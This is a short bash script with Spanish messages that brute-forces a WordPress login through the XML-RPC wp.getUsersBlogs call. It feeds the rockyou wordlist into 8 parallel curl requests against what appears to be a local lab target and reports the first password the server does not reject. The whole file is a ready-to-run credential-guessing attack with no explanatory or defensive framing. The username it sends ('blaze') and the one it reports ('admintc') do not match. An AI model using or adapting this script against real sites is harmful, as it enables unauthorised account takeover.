#!/bin/bash

ctrl_c (){
  echo -e "\n\n[!] Saliendo...\n"
  exit 1
}

# Ctrl + C 
trap ctrl_c SIGINT

createXML (){
  password=$1

  xmlFILE="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>blaze</value></param> 
<param><value>$password</value></param> 
</params> 
</methodCall>"""

  echo $xmlFILE > "file_$password.xml"

  response=$(curl -s -X POST "http://127.0.0.1:31337/xmlrpc.php" -d@"file_$password.xml")
  rm "file_$password.xml"
  
  if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then 
    echo -e "\n [+] Password of admintc is: $password"
    exit 0
  fi
}

export -f createXML

cat /usr/share/dict/rockyou.txt | xargs -P 8 -I {} bash -c 'createXML "$@"' _ {}
